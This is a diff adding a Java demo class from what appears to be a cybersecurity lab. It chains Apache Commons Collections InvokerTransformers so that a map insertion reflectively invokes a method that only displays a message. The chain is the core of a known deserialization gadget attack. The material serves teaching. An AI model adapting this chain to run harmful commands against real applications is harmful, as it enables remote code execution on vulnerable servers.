@@ -1,0 +1,44 @@
+package fr.tp.cyber701.hack;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+public class TransformerDemo {
+
+	public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
+        //HackMessagePane.class.getDeclaredMethod("displayMessage").invoke(null);
+        
+		final Transformer[] hackTransformers = new Transformer[] {
+				ConstantTransformer.getInstance(HackMessagePane.class),
+				
+				new InvokerTransformer( "getMethod", 
+						new Class[]{ String.class, Class[].class },
+                        new Object[]{ "displayMessage", new Class[0] } ),
+				
+				/*new InvokerTransformer( "displayMessage",
+										new Class<?>[] { },
+										new Object[] { } ),*/
+				
+				new InvokerTransformer( "invoke",
+										new Class<?>[] { Object.class },
+										new Object[] { null } ),
+				
+			};
+		
+		ChainedTransformer chain = new ChainedTransformer( hackTransformers );
+
+        Map m = new HashMap();
+        m.put( "1", "1" );
+        Map map = TransformedMap.decorate(m, null, chain );
+        map.put( "a", "b" );
+	}
+
+}
